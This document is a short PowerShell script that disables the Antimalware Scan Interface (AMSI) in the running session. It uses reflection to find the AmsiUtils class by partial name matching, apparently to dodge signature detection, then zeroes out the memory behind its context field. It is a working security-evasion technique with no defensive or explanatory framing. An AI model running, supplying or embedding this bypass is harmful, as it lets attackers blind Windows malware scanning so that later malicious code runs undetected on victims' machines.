$a = [Ref].Assembly.GetTypes()

Foreach ($type in $a){
if ($type.name -like "*iutils*"){
$ams = $type
$amstypes = $ams.GetFields('NonPublic,Static')
}
}


## now that we have each of the different ams fields, lets wipe the context
Foreach ($DifferentType in $amstypes){
if ($DifferentType -like "*context*"){
$amscontext = $DifferentType
$Finalstage = $amscontext.GetValue($null)
[IntPtr]$ptr = $Finalstage
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
}
}
